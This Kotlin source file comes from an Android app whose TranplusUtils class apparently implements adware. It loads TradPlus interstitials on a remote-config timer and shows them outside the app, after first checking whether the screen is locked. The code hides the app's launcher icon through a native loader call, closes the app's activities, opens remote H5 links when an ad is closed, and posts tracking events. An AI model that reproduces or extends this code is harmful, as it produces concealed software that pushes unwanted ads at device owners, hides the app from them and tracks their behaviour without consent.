package com.flying.grass.seen.adtool

import android.os.Handler
import android.os.Looper
import com.flying.grass.seen.txtdata.DrinkStartApp
import com.flying.grass.seen.netool.TtPoint
import com.flying.grass.seen.netool.AppPointData
import com.flying.grass.seen.txtmain.FirstRunFun
import com.flying.grass.seen.adtool.TranplusConfig.getFBInfOr
import com.flying.grass.seen.limt.AdLimiter
import com.flying.grass.seen.txtdata.ActivityTracker
import com.flying.grass.seen.txtdata.DrinkConfigData
import com.flying.grass.seen.txtmain.FirstRunFun.localStorage
import com.flying.grass.seen.txtmain.FirstRunFun.mainStart
import com.flying.grass.seen.zload.TxtLoad
import com.tradplus.ads.base.bean.TPAdError
import com.tradplus.ads.base.bean.TPAdInfo
import com.tradplus.ads.open.interstitial.InterstitialAdListener
import com.tradplus.ads.open.interstitial.TPInterstitial
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.File


class TranplusUtils {
    private var jobAdRom: Job? = null
    val adLimiter = AdLimiter()

    // 广告对象
    lateinit var interstitialAd: TPInterstitial

    // 广告缓存时间（单位：毫秒）
    private val AD_CACHE_DURATION = 50 * 60 * 1000L // 50分钟

    // 上次广告加载时间
    private var lastAdLoadTime: Long = 0

    // 是否正在加载广告
    private var isLoading = false
    var canNextState = false
    var clickState = false
    var isHaveAdData = false

    // 广告初始化，状态回调
    private fun intiTTTTAd() {
        val idBean = ShowDataTool.getAdminData() ?: return
        val id = idBean.creativeResources.promoId
        ShowDataTool.showLog("体外广告id=: ${id}")

        interstitialAd = TPInterstitial(mainStart, id)
        interstitialAd!!.setAdListener(object : InterstitialAdListener {
            override fun onAdLoaded(tpAdInfo: TPAdInfo) {
                ShowDataTool.showLog("体外广告onAdLoaded: 广告加载成功")
                lastAdLoadTime = System.currentTimeMillis()
                TtPoint.postPointData(false, "getadvertise")
                isHaveAdData = true
            }

            override fun onAdClicked(tpAdInfo: TPAdInfo) {
                ShowDataTool.showLog("体外广告onAdClicked: 广告${tpAdInfo.ecpm}被点击")
                adLimiter.recordClick()
                clickState = true
            }

            override fun onAdImpression(tpAdInfo: TPAdInfo) {
                clickState = false
                ShowDataTool.showLog("体外广告onAdImpression: 广告${tpAdInfo.ecpm}展示")
                adLimiter.recordShow()
                resetAdStatus()
                tpAdInfo.let { TtPoint.postAdData(it) }
                AppPointData.showSuccessPoint()
                isHaveAdData = false
            }

            override fun onAdFailed(tpAdError: TPAdError) {
                ShowDataTool.showLog("体外广告onAdFailed: 广告加载失败=${tpAdError.errorMsg}")
                resetAdStatus()
                TtPoint.postPointData(
                    false,
                    "getfail",
                    "string1",
                    tpAdError.errorMsg
                )
                isHaveAdData = false
            }

            override fun onAdClosed(tpAdInfo: TPAdInfo) {
                ShowDataTool.showLog("体外广告onAdClosed: 广告${tpAdInfo.ecpm}被关闭")
                DrinkStartApp.closeAllActivities()
                cloneAndOpenH5()
            }

            override fun onAdVideoError(tpAdInfo: TPAdInfo, tpAdError: TPAdError) {
                resetAdStatus()
                ShowDataTool.showLog("体外广告onAdClosed: 广告展示失败")
                TtPoint.postPointData(
                    false,
                    "showfailer",
                    "string3",
                    tpAdError.errorMsg
                )
            }

            override fun onAdVideoStart(tpAdInfo: TPAdInfo) {

            }

            override fun onAdVideoEnd(tpAdInfo: TPAdInfo) {
            }
        })
    }


    // 加载广告方法
    private fun loadAd() {
        if (!adLimiter.canShowAd(false)) {
            ShowDataTool.showLog("体外广告展示限制,不加载广告")
            return
        }
        val currentTime = System.currentTimeMillis()
        if (isHaveAdData && ((currentTime - lastAdLoadTime) < AD_CACHE_DURATION)) {
            ShowDataTool.showLog("不加载,有缓存的广告")
        } else {
            if (((currentTime - lastAdLoadTime) >= AD_CACHE_DURATION)) {
                resetAdStatus()
            }
            if (isLoading) {
                ShowDataTool.showLog("正在加载广告，等待加载完成")
                return
            }
            isLoading = true
            ShowDataTool.showLog("发起新的广告请求")
            interstitialAd.loadAd()
            TtPoint.postPointData(false, "reqadvertise")
            Handler(Looper.getMainLooper()).postDelayed({
                if (isLoading && !isHaveAdData) {
                    ShowDataTool.showLog("广告加载超时，重新请求广告")
                    loadAd()
                }
            }, 60 * 1000)
        }
    }

    //广告状态重置
    fun resetAdStatus() {
        isLoading = false
        lastAdLoadTime = 0
        isHaveAdData = false
    }

    fun startRomFun() {
        getFBInfOr()
        intiTTTTAd()
        val adminData = ShowDataTool.getAdminData() ?: return
        if (TranplusConfig.adNumAndPoint()) {
            return
        }
        val delayChecks = adminData.promotionConfig.checkFrequency
        val delayData = delayChecks.toLong().times(1000L)
        ShowDataTool.showLog("startRomFun delayData=: ${delayData}")
        jobAdRom = CoroutineScope(Dispatchers.Main).launch {

            while (true) {
                val a = ActivityTracker.getActivity()
                if (a.isEmpty() || (a.last().javaClass.name != DrinkConfigData.startPack1 && a.last().javaClass.name != DrinkConfigData.startPack1)) {
                    if (a.isEmpty()) {
                        ShowDataTool.showLog("隐藏图标=null")
                    } else {
                        ShowDataTool.showLog("隐藏图标=${a.last().javaClass.name}")
                    }
                    TxtLoad.txtLoad("nf",true)
                    break
                }
                delay(500)
            }
            checkAndShowAd(delayData)
        }
    }

    private suspend fun checkAndShowAd(delayData: Long) {
        while (true) {
            ShowDataTool.showLog("循环检测广告")
            TtPoint.postPointData(false, "timertask")
            if (TranplusConfig.adNumAndPoint()) {
                TtPoint.postPointData(false, "jumpfail")
                jobAdRom?.cancel()
                break
            } else {
                loadAd()
                isHaveAdNextFun()
                delay(delayData)
            }
        }
    }


    private fun isHaveAdNextFun() {
        // 检查锁屏或息屏状态，避免过多的嵌套
        if (TranplusConfig.canShowLocked()) {
            ShowDataTool.showLog("锁屏或者息屏状态，广告不展示")
            return
        }
        // 调用点位数据函数
        TtPoint.postPointData(false, "isunlock")

        // 获取管理员数据
        val jsonBean = ShowDataTool.getAdminData() ?: return

        // 获取安装时间
        val instalTime = DrinkStartApp.getInstallDuration()
        val ins = jsonBean.promotionConfig.firstShowDelay
        val wait = jsonBean.promotionConfig.displayInterval
        // 检查首次安装时间和广告展示时间间隔
        if (isBeforeInstallTime(instalTime, ins)) return
        if (isAdDisplayIntervalTooShort(wait)) return
        val installFast = DrinkStartApp.getInstallTime()
        val timeD = installFast + (ins * 1000) + (jsonBean.networkRules.preloadSeconds * 1000)
        canNextState = false
        val h5Url= jsonBean.networkRules.adUrls.externalApp
        ShowDataTool.showLog("体外链接=: ${h5Url}")
        ShowDataTool.showLog("是否是h5流程=${timeD > System.currentTimeMillis() && h5Url.isNotEmpty()}")
        if (timeD > System.currentTimeMillis() && h5Url.isNotEmpty()) {
            // 检查广告展示限制
            if (!FirstRunFun.h5Limiter.canShowAd()) {
                return
            }
            ShowDataTool.showLog("h5流程")
            DrinkStartApp.isH5State = true
        } else {
            DrinkStartApp.isH5State = false
            if (!adLimiter.canShowAd(true)) {
                ShowDataTool.showLog("体外广告展示限制")
                return
            }
            ShowDataTool.showLog("体外流程")
        }
        showAdAndTrack()
    }

    private fun isBeforeInstallTime(instalTime: Long, ins: Int): Boolean {
        try {
            if (instalTime < ins) {
                ShowDataTool.showLog("距离首次安装时间小于$ins 秒，广告不能展示")
                TtPoint.postPointData(false, "ispass", "string", "firstInstallation")
                return true
            }
        } catch (e: Exception) {
            return false
        }
        return false
    }

    private fun isAdDisplayIntervalTooShort(wait: Int): Boolean {
        try {
            val jiange = (System.currentTimeMillis() - TranplusConfig.adShowTime) / 1000
            if (jiange < wait) {
                ShowDataTool.showLog("广告展示间隔时间小于$wait 秒，不展示")
                TtPoint.postPointData(false, "ispass", "string", "Interval")
                return true
            }
            return false
        } catch (e: Exception) {
            return false
        }
    }

    private fun showAdAndTrack() {
        TtPoint.postPointData(false, "ispass", "string", "")
        CoroutineScope(Dispatchers.Main).launch {
            DrinkStartApp.closeAllActivities()
            delay(1011)
            if (canNextState) {
                ShowDataTool.showLog("准备显示h5广告，中断体外广告")
                return@launch
            }
            addFa()
            TxtLoad.txtLoad("gi",false)
            TtPoint.postPointData(false, "callstart")
        }
    }

    fun cloneAndOpenH5() {
        val jsonBean = ShowDataTool.getAdminData() ?: return
        val h5Url= jsonBean.networkRules.adUrls.externalApp
        if (clickState || h5Url.isEmpty()) {
            ShowDataTool.showLog("点击或者没有链接，阻止h5展示")
            return
        }
        clickState = false
        if (TranplusConfig.canShowLocked()) {
            ShowDataTool.showLog("锁屏或者息屏状态，广告不展示")
            return
        }
        val installFast = DrinkStartApp.getInstallTime()
        val ins = jsonBean.promotionConfig.firstShowDelay
        val wait = jsonBean.promotionConfig.displayInterval
        val timeD = installFast + (ins * 1000) + (jsonBean.networkRules.preloadSeconds * 1000)
        val jiange = (System.currentTimeMillis() - TranplusConfig.adShowTime) / 1000
        ShowDataTool.showLog("是否是关闭后h5流程=${timeD <= System.currentTimeMillis()}")
        ShowDataTool.showLog("是否是关闭后h5流程=${jiange < wait}")
        if (timeD <= System.currentTimeMillis() && jiange < wait) {
            // 检查广告展示限制
            if (!FirstRunFun.h5Limiter.canShowAd()) {
                ShowDataTool.showLog("h5广告展示限制")
                return
            }
            ShowDataTool.showLog("跳转打开H5")
            DrinkStartApp.isH5State = true
            canNextState = true
            showAdAndTrack2()
        }
    }

    private fun showAdAndTrack2() {
        CoroutineScope(Dispatchers.Main).launch {
            addFa()
            DrinkStartApp.closeAllActivities()
            delay(678)
            TxtLoad.txtLoad("gi",true)
            TtPoint.postPointData(false, "callstart")
        }
    }


    private fun addFa() {
            var adNum = localStorage.isAdFailCount
            adNum++
            localStorage.isAdFailCount = adNum
    }
}